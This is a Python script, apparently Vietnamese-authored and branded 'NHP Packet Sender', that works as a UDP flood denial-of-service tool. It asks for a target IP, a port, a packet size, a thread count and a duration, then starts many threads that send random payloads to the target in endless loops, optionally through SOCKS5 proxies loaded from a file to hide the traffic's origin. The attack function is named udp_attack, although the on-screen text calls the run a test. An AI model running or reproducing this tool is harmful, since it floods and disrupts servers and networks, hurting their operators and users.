
import socket
import socks
import random
import threading
import time
import sys
import os
from colorama import Fore, Style, init
from pyfiglet import Figlet

init(autoreset=True)

# Hiện banner
os.system("cls" if os.name == "nt" else "clear")
figlet = Figlet(font='slant')
print(Fore.RED + figlet.renderText("NHP Packet Sender"))
print(Fore.GREEN + "Version Python" + Style.RESET_ALL)

target = input("Nhập IP server: ")
port = int(input("Nhập Port: "))
packet_size = int(input("Kích thước gói tin (byte): "))
thread_count = int(input("Số luồng (threads): "))
duration = int(input("Thời gian chạy (giây, 0 = mãi mãi): "))
use_proxy = input("Dùng proxy? (y/n): ").strip().lower() == "y"

proxy_list = []
if use_proxy:
    try:
        with open("proxies.txt", "r") as f:
            proxy_list = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(Fore.RED + "[X] Không tìm thấy proxies.txt")
        sys.exit()

print(Fore.CYAN + "[i] Giao thức được chọn: UDP")
print(Fore.YELLOW + f"[=>] Bắt đầu test UDP tới {target}:{port}...\n")

sent = 0
errors = 0
lock = threading.Lock()

def udp_attack(proxy=None):
    global sent, errors
    try:
        if proxy:
            p_ip, p_port = proxy.split(":")
            s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
            s.set_proxy(socks.SOCKS5, p_ip, int(p_port))
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        payload = random._urandom(packet_size)
        while True:
            try:
                s.sendto(payload, (target, port))
                with lock:
                    sent += 1
            except:
                with lock:
                    errors += 1
    except:
        with lock:
            errors += 1

def start():
    global sent, errors
    start_time = time.time()
    end_time = start_time + duration if duration > 0 else None

    for i in range(thread_count):
        proxy = proxy_list[i % len(proxy_list)] if use_proxy and proxy_list else None
        t = threading.Thread(target=udp_attack, args=(proxy,), daemon=True)
        t.start()

    try:
        while True:
            elapsed = time.time() - start_time
            with lock:
                pps = sent / elapsed if elapsed > 0 else 0
                print(f"[+] Sent: {sent} | Errors: {errors} | Elapsed: {elapsed:.2f}s | PPS: {pps:.2f}")
            if end_time and time.time() >= end_time:
                break
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Đã dừng theo yêu cầu người dùng.")

start()